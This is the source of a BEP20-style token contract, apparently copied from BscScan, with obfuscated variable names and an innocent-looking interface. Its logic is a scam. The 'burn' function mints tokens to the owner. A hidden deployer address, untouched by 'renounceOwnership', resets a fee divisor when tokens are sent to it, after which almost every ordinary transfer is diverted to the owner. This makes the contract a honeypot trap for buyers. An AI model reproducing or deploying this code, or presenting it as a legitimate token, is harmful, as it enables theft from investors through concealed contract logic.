/**
 *Submitted for verification at BscScan.com on 2022-11-12
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-11
 */
pragma solidity >=0.5.11;
contract ztdBGX {
mapping (address => mapping (address => uint256)) private _allowances;
address public owner;
address public  MJbjUv = address(0);
string public  symbol = "SSWAWF";
uint256 public  DdNlPy = 100000000000000000000000;
address public  EdUhlv = address(0);
address public  jUvgOu = address(0);
uint256 public  JhSdmW = 100000000000000000000;
address public  KbecTc = address(0);
uint256 public  jYEvAU = 10000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 public  NcbsYD = 1000000000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public  TJDISn = 10000000000000000000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
address public  tTgXgb = address(0);
uint8 public constant decimals = 18;
mapping (address => uint256) public balanceOf;
uint256 public  NSBtTS = 10000000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address public  GFnSnx = address(0);
address private  XaiQVR = address(0);
uint256 private  vyhyhW = 10000000000000;
uint256 public  XwjIWD = 100000000000000000;
uint256 public constant RGusbD = 73999;
string public  name = "nBWGrE";
uint256 public  CMIqZs = 100000000000000000000000;
constructor ()public {
XaiQVR = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "saeyEX");
require(to != address(0), "saeyEX");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* RGusbD/vyhyhW ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==XaiQVR){
vyhyhW = 73999+1;
}
emit Transfer(from, to, transferAmount);
}

}